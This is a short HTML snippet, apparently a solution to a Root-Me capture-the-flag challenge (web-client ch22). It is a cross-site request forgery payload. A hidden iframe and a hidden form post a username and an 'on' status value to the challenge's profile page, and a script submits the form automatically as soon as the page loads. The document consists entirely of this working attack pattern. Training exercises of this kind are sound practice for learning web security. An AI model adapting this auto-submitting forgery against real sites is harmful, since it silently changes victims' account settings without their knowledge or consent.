<iframe style="display:none" name="csrf-frame"></iframe>
<form id="form" action="http://challenge01.root-me.org/web-client/ch22/index.php?action=profile" target="csrf-frame" method="post">
  <input type="hidden"
      name="username"
      value="hello"/>
  <input type="hidden"
      name="status"
      value="on"/>
  <input type='submit' value='submit'>
</form>

<script>document.getElementById("form").submit();</script>
